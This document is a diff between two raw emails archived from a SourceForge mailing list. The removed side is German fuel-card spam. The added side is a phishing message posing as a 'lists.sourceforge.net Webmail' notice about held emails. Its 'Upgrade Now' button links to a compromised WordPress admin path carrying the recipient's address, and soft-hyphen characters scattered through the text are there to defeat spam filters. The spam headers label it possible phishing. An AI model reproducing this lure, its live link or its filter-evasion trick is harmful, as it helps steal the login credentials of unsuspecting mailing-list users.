@@ -2,80 +2,84 @@ Return-Path: <osst-users-bounces@lists.sourceforge.net>
 X-Original-To: lists+osst-users@lfdr.de
 Delivered-To: lists+osst-users@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id 5BC1F310AC
-	for <lists+osst-users@lfdr.de>; Fri, 31 May 2019 16:55:27 +0200 (CEST)
-Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
-	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
+	by mail.lfdr.de (Postfix) with ESMTPS id E31DA32728
+	for <lists+osst-users@lfdr.de>; Mon,  3 Jun 2019 06:15:06 +0200 (CEST)
+Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
+	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
 	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
-	id 1hWiwI-0001gA-3q
-	for lists+osst-users@lfdr.de; Fri, 31 May 2019 14:55:26 +0000
+	id 1hXeNF-00039A-JU
+	for lists+osst-users@lfdr.de; Mon, 03 Jun 2019 04:15:05 +0000
 Received: from [172.30.20.202] (helo=mx.sourceforge.net)
- by sfs-ml-2.v29.lw.sourceforge.com with esmtps
+ by sfs-ml-4.v29.lw.sourceforge.com with esmtps
  (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
- (envelope-from <infos@niplusnimoins.site>) id 1hWiwG-0001g2-Ep
- for osst-users@lists.sourceforge.net; Fri, 31 May 2019 14:55:24 +0000
+ (envelope-from <noreply@accounts.com>) id 1hXeNE-000393-Km
+ for osst-users@lists.sourceforge.net; Mon, 03 Jun 2019 04:15:04 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
  d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
- :Message-ID:Subject:From:To:Date:Sender:Reply-To:Cc:Content-ID:
+ :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=OF+aQiLQ5Ft4CqhhjxxGciKp6dDI7ivlIkYPSeBRetw=; b=Hc3huhPaM4/Z2V/cj9tBJOvfXs
- FdpwG95G/m45ftFhLMqgneRNhBKPR7kZLvuLRa5shKeEtj/nPrLHJHOZ7MsnIrINKvJRvNo2GOVEv
- cu58Zl8CygvLTiBQmsuzFGchhMIIQe/BIPRwrSzX2FmT1spZa3YK5KBrnhaq2rMbF1Gg=;
+ bh=lfr7x4zPoRbSUyaxQA9jaRZbodPeUWCLnmIm3bdTAT0=; b=meiMapI0Y7NwddO8A3LFHwh08B
+ MvrzDFSdRDJnMnbA5vPwpxg0bQJU8rjmkxBbXZulvY6mwWDCUbeEvF77/dqxISYDN0NmWh38Rm7Gj
+ crjJjP41S6HkncSWfrRQ1HmtrG/20MmoUB66jCC3iicdwAQrzn7t4f653+cr/474lFwk=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Subject:
- From:To:Date:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
- Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
+ h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
+ Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
+ :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=OF+aQiLQ5Ft4CqhhjxxGciKp6dDI7ivlIkYPSeBRetw=; b=F
- rw8cpHEHhPCEiZG141bCNPR8dqCM/8H5L3iYRZgLQoL5xfqF6xPp1PZAqweuai2VmniExuSSYF9qS
- cfjW4ld2p2ZpWqMas3zoGWbijgVn9AetXO020uU39pYtZrk27AX1hVBWr4UssUfX/IvY1BsBPe/D4
- 27JuQWoPGuZDgn5c=;
-Received: from smtp13.smtpout.orange.fr ([80.12.242.135]
- helo=smtp.smtpout.orange.fr)
- by sfi-mx-3.v28.lw.sourceforge.com with esmtps (TLSv1:DHE-RSA-AES128-SHA:128)
- (Exim 4.90_1) id 1hWiwE-00AzdH-4l
- for osst-users@lists.sourceforge.net; Fri, 31 May 2019 14:55:24 +0000
-Received: from devanti ([10.163.22.116]) by mwinf5d74 with ME
- id K2vD2000f2WGrGS032vDvY; Fri, 31 May 2019 16:55:14 +0200
-X-ME-Helo: devanti
-X-ME-Date: Fri, 31 May 2019 16:55:14 +0200
-X-ME-IP: 10.163.22.116
-Date: Fri, 31 May 2019 16:55:13 +0200
+ List-Owner:List-Archive; bh=lfr7x4zPoRbSUyaxQA9jaRZbodPeUWCLnmIm3bdTAT0=; b=E
+ 8ZknxA3aBQjdqC64WthKskA6XIb+089GQLDVF0VQ2E4HlL+Gx37fcxnW/NCakybA8oVcVaLau2rA4
+ DIKoo8RrRDCtI0+qY8a2M5CtWGvdtuvx8TKtoElOck1AeICLl/viKVhF648ZTdG/rm0ct3MXI5SMd
+ Osc8q8TZki7WiCg0=;
+Received: from mail.nhatkim.com.vn ([203.162.166.97])
+ by sfi-mx-4.v28.lw.sourceforge.com with esmtps
+ (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
+ id 1hXeND-002FpE-A6
+ for osst-users@lists.sourceforge.net; Mon, 03 Jun 2019 04:15:04 +0000
+Received: from localhost (localhost [127.0.0.1])
+ by mail.nhatkim.com.vn (Postfix) with ESMTP id 5E6019E8929
+ for <osst-users@lists.sourceforge.net>; Mon,  3 Jun 2019 11:14:47 +0700 (ICT)
+Received: from mail.nhatkim.com.vn ([127.0.0.1])
+ by localhost (mail.nhatkim.com.vn [127.0.0.1]) (amavisd-new, port 10032)
+ with ESMTP id NruxA3NfdTTY for <osst-users@lists.sourceforge.net>;
+ Mon,  3 Jun 2019 11:14:47 +0700 (ICT)
+Received: from localhost (localhost [127.0.0.1])
+ by mail.nhatkim.com.vn (Postfix) with ESMTP id 11B669E8D2B
+ for <osst-users@lists.sourceforge.net>; Mon,  3 Jun 2019 11:14:47 +0700 (ICT)
+X-Virus-Scanned: amavisd-new at nhatkim.com.vn
+Received: from mail.nhatkim.com.vn ([127.0.0.1])
+ by localhost (mail.nhatkim.com.vn [127.0.0.1]) (amavisd-new, port 10026)
+ with ESMTP id ch3fS2mcaZMs for <osst-users@lists.sourceforge.net>;
+ Mon,  3 Jun 2019 11:14:46 +0700 (ICT)
+Received: from accounts.com (unknown [96.9.249.124])
+ by mail.nhatkim.com.vn (Postfix) with ESMTPSA id 216539E8DFE
+ for <osst-users@lists.sourceforge.net>; Mon,  3 Jun 2019 11:14:45 +0700 (ICT)
+From: lists.sourceforge.net<noreply@accounts.com>
 To: osst-users@lists.sourceforge.net
-From: Sparen sie geld <infos@niplusnimoins.site>
-Message-ID: <2574710b4c43aa1c1ca85e3949835c40@devanti>
-X-Priority: 3
-X-Mailer: dope
+Date: 02 Jun 2019 21:14:44 -0700
+Message-ID: <20190602211443.661A6EB1F37E692A@accounts.com>
 MIME-Version: 1.0
 X-Spam-Score: 7.6 (+++++++)
 X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
  See http://spamassassin.org/tag/ for more details.
- 2.5 URIBL_DBL_SPAM         Contains a spam URL listed in the Spamhaus DBL
- blocklist [URIs: kecetop.fr]
- -0.0 RCVD_IN_DNSWL_NONE     RBL: Sender listed at https://www.dnswl.org/, no
- trust [80.12.242.135 listed in list.dnswl.org]
- 0.1 URIBL_SBL_A Contains URL's A record listed in the Spamhaus SBL
- blocklist [URIs: kecetop.fr]
- 0.6 URIBL_SBL Contains an URL's NS IP listed in the Spamhaus SBL
- blocklist [URIs: kecetop.fr]
- 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
+ 0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
+ See
+ http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
+ for more information. [URIs: candlesontheweb.co.uk]
+ 1.3 RCVD_IN_RP_RNBL        RBL: Relay in RNBL,
+ https://senderscore.org/blacklistlookup/
+ [203.162.166.97 listed in bl.score.senderscore.com]
+ 0.0 SPF_NONE               SPF: sender does not publish an SPF Record
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
- 0.0 HTML_IMAGE_RATIO_08    BODY: HTML has a low ratio of text to image area
- 0.0 MIME_HTML_MOSTLY       BODY: Multipart message mostly text/html MIME
  1.0 HTML_MESSAGE           BODY: HTML included in message
- 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or identical to
- background
- 0.7 MPART_ALT_DIFF         BODY: HTML and text parts are different
- 0.5 RAZOR2_CHECK           Listed in Razor2 (http://razor.sf.net/)
- 1.5 RAZOR2_CF_RANGE_51_100 Razor2 gives confidence level above 50%
- [cf: 100]
- 0.0 T_REMOTE_IMAGE         Message contains an external image
- -0.3 AWL AWL: Adjusted score from AWL reputation of From: address
-X-Headers-End: 1hWiwE-00AzdH-4l
-Subject: [Osst-users] Benutzen Sie Ihre Karte an Tausenden Tankstellen
+ 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+ 0.6 HTML_MIME_NO_HTML_TAG  HTML-only message, but there is no HTML tag
+ 2.4 URI_WPADMIN            WordPress login/admin URI, possible phishing
+X-Headers-End: 1hXeND-002FpE-A6
+Subject: [Osst-users] lists.sourceforge.net Notification for
+ osst-users@lists.sourceforge.net
 X-BeenThere: osst-users@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -87,170 +91,73 @@ List-Post: <mailto:osst-users@lists.sourceforge.net>
 List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
  <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
-Content-Type: multipart/mixed; boundary="===============8296100728784021183=="
+Content-Type: multipart/mixed; boundary="===============3262086491427284327=="
 Errors-To: osst-users-bounces@lists.sourceforge.net
 
---===============8296100728784021183==
-Content-Type: multipart/alternative;
-	boundary="b1_2574710b4c43aa1c1ca85e3949835c40"
-Content-Transfer-Encoding: 8bit
+--===============3262086491427284327==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
---b1_2574710b4c43aa1c1ca85e3949835c40
-Content-Type: text/plain; charset=us-ascii
+<p><b style=3D"color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-=
+serif; font-size: small;"><font color=3D"#0000ff" size=3D"4">lists.sourcefo=
+rge.net Webmail</font></b></p>
 
-der
+<p><span style=3D"color: rgb(255, 0, 0); font-size: large; font-weight: 700=
+;">N&shy;o&shy;t&shy;i&shy;f&shy;i&shy;c&shy;at&shy;io&shy;n for:&nbsp;osst=
+-users@lists.sourceforge.net</span></p>
+
+<p>lists.sourceforge.net h&shy;a&shy;s&nbsp;p&shy;r&shy;e&shy;v&shy;e&shy;n=
+&shy;t&shy;e&shy;d the&nbsp;de&shy;l&shy;iv&shy;er&shy;y&nbsp;of&nbsp;7 n&s=
+hy;e&shy;w e&shy;m&shy;ails &shy;t&shy;o y&shy;o&shy;ur i&shy;nb&shy;o&shy;=
+x</p>
+
+<p>a&shy;s of 06&nbsp;, 02&nbsp;, 2019 12:00 PM&nbsp;(&shy;U&shy;T&shy;C)&n=
+bsp;b&shy;e&shy;c&shy;ause &shy;it &shy;id&shy;en&shy;ti&shy;fi&shy;ed &shy=
+;th&shy;es&shy;e &shy;m&shy;es&shy;sa&shy;ge&shy;s &shy;as s&shy;p&shy;a&sh=
+y;m.<br />
+Y&shy;o&shy;u ca&shy;n Upgrade Now&nbsp;he&shy;re and c&shy;hoo&shy;se&shy;=
+ w&shy;ha&shy;t h&shy;ap&shy;pe&shy;n&shy;s t&shy;o t&shy;h&shy;e&shy;m</p>=
 
 
---b1_2574710b4c43aa1c1ca85e3949835c40
-Content-Type: text/html; charset=us-ascii
+<table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D"0" he=
+ight=3D"45" style=3D"letter-spacing: 0px; background-color: rgb(143, 190, 0=
+); margin: 0px; border-spacing: 0px; border-collapse: collapse; font-family=
+: Poppins, sans-serif; color: rgb(0, 0, 0); border-radius: 3px;" width=3D"2=
+20">
+	<tbody>
+		<tr>
+			<td align=3D"middle" style=3D"font-family: Roboto, RobotoDraft, Helvetic=
+a, Arial, sans-serif; margin: 0px; padding: 5px;" valign=3D"center"><a data=
+-saferedirectreason=3D"2" data-saferedirecturl=3D"https://www.google.com/ur=
+l?q=3Dhttp://www.springspune.com/css/update/index.php?email%3D%5B%5B-Email-=
+%5D%5D&amp;source=3Dgmail&amp;ust=3D1558817718963000&amp;usg=3DAFQjCNFi5eQX=
+HmNd4aHB38E19LuCaNLx1w" href=3D"https://candlesontheweb.co.uk/blog/wp-admin=
+/includes/update?email=3Dosst-users@lists.sourceforge.net%22" rel=3D"norefe=
+rrer" style=3D"color: rgb(255, 255, 255); line-height: 26px; font-family: P=
+oppins, sans-serif; letter-spacing: 0.02em; font-size: 17px; text-decoratio=
+n-line: none;" target=3D"_blank">Upgrade Now</a></td>
+		</tr>
+	</tbody>
+</table>
 
-<!DOCTYPE html>
-			                   <html>
-				               	<head>
-					            	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">			
-				                </head>
-				                <body>
-					            	<body marginwidth="0" marginheight="0" leftmargin="0" topmargin="0" rightmargin="0"><center>
-<!--[if (gte mso 9)|(IE)]>
-<table id="tableForOutlook" align="center" border="0" cellpadding="0" cellspacing="0" width="600"><tr><td width="600">
-<![endif]--> 
-<!--[if gte mso 9]>
-<table id="tableForOutlook" align="center" border="0" cellpadding="0" cellspacing="0" width="600"><tr><td width="600">
-<![endif]--> 
-<!--[if gte mso 8]>
-<table id="tableForOutlook" align="center" border="0" cellpadding="0" cellspacing="0" width="600"><tr><td width="600">
-<![endif]--> 
-<!--[if gte mso 7]>
-<table id="tableForOutlook" align="center" border="0" cellpadding="0" cellspacing="0" width="600"><tr><td width="600">
-<![endif]-->
-  <table align="center" border="0" cellpadding="0" cellspacing="0">
-  <tbody><tr>
-    <td height="30" style="text-align:center">
-<font style="font-family:Arial, Helvetica, sans-serif; font-size:12px">
-<a href="http://kecetop.fr/fuelde/karte/" target="_blank" style="color:#0194ce">Die Tankkarte:</a> das unerl&auml;ssliche Tool f&uuml;r Ihre Fahrten !</font></td>
-  </tr>
-</tbody></table>
-<table bgcolor="#ffffff" align="center" style="border-spacing:0;font-family:sans-serif;color:#333333;Margin:0 auto;max-width:600px; width: 100%;" border="0" cellpadding="0" cellspacing="0">
-    <tbody><tr>
-      <td><table align="center" style="border-spacing:0;font-family:sans-serif;color:#333333;Margin:0 auto;max-width:600px;width:100%" border="0" cellpadding="0" cellspacing="0">
-          <tbody><tr>
-            <td width="20"></td>
-            <td><table align="center" style="border-spacing:0;font-family:sans-serif;color:#333333;Margin:0 auto;max-width:560px;width:100%" border="0" cellpadding="0" cellspacing="0">
-                <tbody><tr><td height="20"></td></tr>
-        <tr><td style="text-align: center"><a href="http://kecetop.fr/fuelde/karte/" style="font-family:Arial, Helvetica, sans-serif; text-decoration:none ;" target="_blank"><span style="font-family:Arial, Helvetica, sans-serif; font-size:24px ; font-weight:normal; color:#2d3dc8;">Behalten Sie den &Uuml;berblick &uuml;ber Ihre Fahrtkosten</span></a></td></tr>
-        <tr><td style="line-height: 10px; font-size: 10px; height: 10px" height="10"></td></tr>
-        <tr><td style="text-align: center"><a href="http://kecetop.fr/fuelde/karte/" style="font-family:Arial, Helvetica, sans-serif; text-decoration:none ;" target="_blank"><span style="font-family:Arial, Helvetica, sans-serif; font-size:26px ; font-weight:bold; color:#000000;">Dank Ihrer Tankkarte</span></a></td></tr>
-        <tr><td style="line-height: 10px; font-size: 10px; height: 10px" height="10"></td></tr>
-              </tbody></table></td>
-            <td width="20"></td>
-          </tr>
-        </tbody></table></td>
-    </tr>
-  
-<tr>
-<td background="http://kecetop.fr/fuelde/background.jpg" bgcolor="#0F2C3E" width="600" height="376" valign="top" style="background-repeat: no-repeat;background-size: cover;background-position: left">
-<!--[if gte mso 9]>
-<v:rect xmlns:v="urn:schemas-microsoft-com:vml" fill="true" stroke="false" style="width:600px; height:376px;">
-  <v:fill type="tile" src="http://kecetop.fr/fuelde/background.jpg" color="#0F2C3E" />
- <v:textbox inset="0,0,0,0">
-<![endif]-->
-<table align="center" style="border-spacing:0;font-family:sans-serif;color:#333333;Margin:0 auto;max-width:600px; width:100%" border="0" cellpadding="0" cellspacing="0">
-    <tbody><tr>
-  <td style="width:100%; max-width:600px" align="center"><a href="http://kecetop.fr/fuelde/karte/" style="font-family:Arial, Helvetica, sans-serif; text-decoration:none ;" target="_blank">
-<img src="http://kecetop.fr/fuelde/cta.png" width="330" height="76" border="0" style="display:inline-block;max-width:330px;width:100%;"></a>
-  </td>
-  </tr>
-<tr>
-    <td class="two-column" style="text-align:center;font-size:0; width: 100%; max-width: 600px"><!--[if (gte mso 9)|(IE)]>
-                        <table width="100%" style="border-spacing:0;font-family:sans-serif;color:#333333;" border="0"  cellpadding="0" cellspacing="0" >
-                        <tr>
-                        <td width="300" valign="top" style="padding-top:0;padding-bottom:0;padding-right:0;padding-left:0;" >
-      <![endif]-->
-      
-      <table class="column" style="border-spacing:0;font-family:sans-serif;color:#333333;text-align:center;max-width:315px;width:100%;  display:inline-block;vertical-align:top;margin-top:0;margin-bottom:0;" border="0" cellpadding="0" cellspacing="0">
-        <tbody><tr>
-      <td width="30"></td>
-          <td style="padding-top:0;padding-bottom:0;padding-right:0;padding-left:0;"><table cellpadding="0" cellspacing="0" class="contents" style="border-spacing:0;font-family:sans-serif;color:#333333;font-size:14px;text-align:center;" border="0" width="255">
-        <tbody><tr><td height="40"></td></tr>
-              <tr><td><table border="0" cellpadding="0" cellspacing="0"><tbody><tr>
-                <td style="padding-top:0;padding-bottom:0;padding-right:0;padding-left:0;" align="left" valign="top"><img src="http://kecetop.fr/fuelde/bullet.png" width="21" height="20" border="0" style="display:inline-block"></td><td style="text-align: left"><span style="font-family:Arial, Helvetica, sans-serif; font-size:18px ; font-weight:normal; color:#FFFFFF;">Erhalten Sie eine einmalige Rechnung </span></td>
-              </tr></tbody></table></td></tr>
-        <tr><td style="line-height: 15px; font-size: 15px; height: 15px" height="15"></td></tr>
-         <tr><td><table border="0" cellpadding="0" cellspacing="0"><tbody><tr>
-                <td style="padding-top:0;padding-bottom:0;padding-right:0;padding-left:0;" align="left" valign="top"><img src="http://kecetop.fr/fuelde/bullet.png" width="21" height="20" border="0" style="display:inline-block"></td><td style="text-align: left"><span style="font-family:Arial, Helvetica, sans-serif; font-size:18px ; font-weight:normal; color:#FFFFFF;">&Uuml;berblicken Sie die Ausgaben Ihrer Angestellten</span></td>
-              </tr></tbody></table></td></tr>
-        <tr><td style="line-height: 15px; font-size: 15px; height: 15px" height="15"></td></tr>
-         <tr><td><table border="0" cellpadding="0" cellspacing="0"><tbody><tr>
-                <td style="padding-top:0;padding-bottom:0;padding-right:0;padding-left:0;" align="left" valign="top"><img src="http://kecetop.fr/fuelde/bullet.png" width="21" height="20" border="0" style="display:inline-block"></td><td style="text-align: left"><span style="font-family:Arial, Helvetica, sans-serif; font-size:18px ; font-weight:normal; color:#FFFFFF;">Benutzen Sie Ihre Karte an Tausenden Tankstellen</span></td>
-              </tr></tbody></table></td></tr>
-        
-            </tbody></table></td>
-      <td width="30"></td>
-        </tr>
-      </tbody></table>
-      
-      <!--[if (gte mso 9)|(IE)]>
-                        </td><td width="285" valign="top" style="padding-top:0;padding-bottom:0;padding-right:0;padding-left:0;" >
-      <![endif]-->
-      
-      <table class="column" style="border-spacing:0;font-family:sans-serif;color:#333333;text-align:center;max-width:285px;display:inline-block;vertical-align:top;margin-top:0;margin-bottom:0;" border="0" cellpadding="0" cellspacing="0">
-         <tbody><tr>
-                <td style="padding-top:0;padding-bottom:0;padding-right:0;padding-left:0;"><a href="http://kecetop.fr/fuelde/karte/" style="font-family:Arial, Helvetica, sans-serif; text-decoration:none ;" target="_blank"><img src="http://kecetop.fr/fuelde/fuel_card.png" width="285" height="248" border="0" style="display:inline-block"></a></td>
-              </tr>
-      </tbody></table>
-      
-      <!--[if (gte mso 9)|(IE)]>
-                        </td>
-                        </tr>
-                        </table>
-      <![endif]--></td>
-  </tr>
-   </tbody></table>
-   <!--[if gte mso 9]>
-  </v:textbox>
-</v:rect>
-<![endif]-->
-</td>
-</tr> 
-  
-  
-</tbody></table>
-<!--[if gte mso 7]>
-</td></tr></table>
-<![endif]--> 
-<!--[if gte mso 8]>
-</td></tr></table>
-<![endif]--> 
-<!--[if gte mso 9]>
-</td></tr></table>
-<![endif]--> 
-<!--[if (gte mso 9)|(IE)]>
-</td></tr></table>
-<![endif]-->
-<td align="center" height="60"><font style=" font-family: Arial,Helvetica,sans-serif; font-size: 10px; color:#666666;"><br>Keine weiteren Informationen von Tankkarte, volgt u deze link : <a href="http://kecetop.fr/fuelde/ripe/?email=XSB64vAerngUdoq1O2t/AHAwqNAcpokHoNKHYy1ZUSUOcqDHucZNm3McNwYfLiQVHOx67HF3Q5QB1Ua4k4evKgDjaZaEDrHwZ3oBhuiC/DG/TF74qOESjtK3tx1DgJ5JM3vYC7fk5YCOL9Ve6ERhvRoleUcOUq4uObI530HmsKk=&c=ruhr">Abmelden</a><br>
-GHM LLP - Office 4, 219 Kensington High Street, Kensington, W8 6BD, United Kingdom - Registration number OC424779<br>
-Sie haben das Recht auf Zugang, Berichtigung, Widerspruch und Zustimmung, auf die Sie &uuml;ber diese Webseite zugreifen k&ouml;nnen: <a href="http://kecetop.fr/fuelde/vite/">Datenschutzerkl&auml;rung</a>.
-<br>
-Sie erhalten diese Nachricht an Ihre E-Mail-Adresse, da Sie sich in der Liste der Manager und Experten.
-</font><br /></td>
-</center></body>
-				                </body>
-			                   </html>
+<p><span class=3D"wdfxihl_t8idu44E"><span class=3D"kpT4oC2_rjmTt">&shy;Powe=
+red by: lists.sourceforge.net</span></span></p>
+
+<p>Copyright lists.sourceforge.net</p>
+
+<div>&nbsp;</div>
 
 
 
---b1_2574710b4c43aa1c1ca85e3949835c40--
-
-
-
---===============8296100728784021183==
+--===============3262086491427284327==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============8296100728784021183==
+--===============3262086491427284327==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -261,6 +168,4 @@ Osst-users mailing list
 Osst-users@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/osst-users
 
---===============8296100728784021183==--
-
-
+--===============3262086491427284327==--
